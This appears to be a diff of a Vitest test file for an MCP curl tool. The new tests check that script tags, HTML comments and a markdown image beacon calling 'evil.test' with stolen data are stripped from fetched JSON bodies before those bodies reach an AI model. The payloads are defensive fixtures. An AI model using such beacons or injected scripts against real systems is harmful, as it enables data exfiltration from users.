@@ -43,7 +43,17 @@ vi.mock("../security/index.js", async () => {
 vi.mock("../execution/index.js", async () => {
     const actual =
         await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
-    return { ...actual, executeCommand: vi.fn() };
+    // **`platformSupportsHeaderDump` is pinned, and without it this suite was
+    // green only on darwin.** `curl-execute.ts` takes the `headersUnsupported`
+    // branch on any other host, so `responseHeaders` is undefined, only one
+    // content entry is emitted, and the two-region cases below fail on a Linux
+    // runner. Both sibling suites pin it and both say why; this one adopted
+    // neither and the omission was invisible because the shared fixture supplies
+    // `headerBytes` unconditionally.
+    //
+    // Worth stating plainly: the assertions it silently skipped are the ones
+    // that would have caught the notice-prefix splice (`LESSONS.md` RC-41).
+    return { ...actual, executeCommand: vi.fn(), platformSupportsHeaderDump: () => true };
 });
 
 const executionModule = await import("../execution/index.js");
@@ -211,6 +221,30 @@ describe("018 AC3/AC4/AC5 — a non-JSON body is reported, not inlined", () => {
         });
     }
 
+    it("actually STRIPS a bare-scalar body's markup before persisting it", async () => {
+        // **This is the case the AC5 loop above could not see, and the gap was
+        // real.** Those cases assert the *report* names `bare-scalar`; none of
+        // them reads the file. A bare-scalar JSON body took
+        // `defendText(…, { contentTypeUndetermined: true })` and no strip stage
+        // ran, because `defendText` re-asked the JSON question with the looser
+        // `isDefinitelyJson` — for which `'"<script>x</script>"'` is TRUE — and
+        // that cancelled the strictest grammar the call had requested.
+        //
+        // Meanwhile `savedMessage` told the model those bytes "have been through
+        // the full defence pipeline". So the artefact is what has to be asserted,
+        // not the sentence describing it.
+        for (const [name, body, forbidden] of [
+            ["script tag", '"<script>alert(1)</script>"', "<script"],
+            ["markdown beacon", '"![x](https://evil.test/?d=stolen)"', "evil.test"],
+            ["html comment", '"a <!-- b --> c"', "<!--"],
+        ] as Array<[string, string, string]>) {
+            const text = await fetchBody(body, "application/json");
+            expect(text).toContain("bare-scalar");
+            const onDisk = await readFile(savedPathFrom(text), "utf-8");
+            expect(onDisk, `${name} survived into the artefact`).not.toContain(forbidden);
+        }
+    });
+
     it("reports the byte count and the path, and echoes NO remote token", async () => {
         // **The declared content type is deliberately absent from this
         // sentence.** `docs/todos/018` settles it onto the `include_metadata`
@@ -348,6 +382,8 @@ describe("018 — two remote regions, two content entries", () => {
             })
         );
 
+        // Body, then header text. No third entry: a clean exit with headers
+        // captured produces no notices.
         expect(result.content).toHaveLength(2);
         // The body region: untouched, every field intact. Merged into one entry
         // this returned `{"a":"open ","d":"kept"}` — `b` and `c` deleted, still
@@ -363,6 +399,49 @@ describe("018 — two remote regions, two content entries", () => {
         expect(result.content[1]!.text).toContain("HTTP/1.1 200 OK");
         expect(result.content[0]!.text).not.toContain("HTTP/1.1");
     });
+
+    // -----------------------------------------------------------------------
+    // The notice is a THIRD region, and it was the second join in one function.
+    // One case per trigger, because each is reached by a different flag and the
+    // one that used to be covered was neutralised by a platform mock.
+    // `LESSONS.md` RC-41.
+    // -----------------------------------------------------------------------
+    for (const [trigger, fixture] of [
+        ["non-zero cURL exit", { exitCode: 18 }],
+        ["headers requested but none arrived", { headerBlock: "", includeHeaders: true }],
+    ] as Array<[string, { exitCode?: number; headerBlock?: string; includeHeaders?: boolean }]>) {
+        it(`keeps every key when a notice is present (${trigger})`, async () => {
+            const base = curlOutputFor({
+                body: spliceable,
+                contentType: "application/json",
+                ...(fixture.headerBlock === undefined ? {} : { headerBlock: fixture.headerBlock }),
+            });
+            mockedExecuteCommand.mockResolvedValue({
+                ...base,
+                ...(fixture.exitCode === undefined ? {} : { exitCode: fixture.exitCode }),
+            });
+            const result = await executeCurlRequest(
+                params({
+                    url: "https://example.test/x",
+                    include_metadata: false,
+                    ...(fixture.includeHeaders ? { include_headers: true } : {}),
+                })
+            );
+
+            // The body entry is still entry 0 and still parses on its own — the
+            // notice cannot have been prefixed to it.
+            expect(result.content[0]!.text).toBe(spliceable);
+            expect(Object.keys(JSON.parse(result.content[0]!.text) as object)).toEqual([
+                "a",
+                "b",
+                "c",
+                "d",
+            ]);
+            // And the notice really was produced, or this case proves nothing.
+            const notice = result.content.find((c) => c.text.startsWith("[mcp-curl]"));
+            expect(notice, "no notice was produced, so the case is vacuous").toBeDefined();
+        });
+    }
 
     it("emits a single entry when no header text was reported", async () => {
         mockedExecuteCommand.mockResolvedValue(
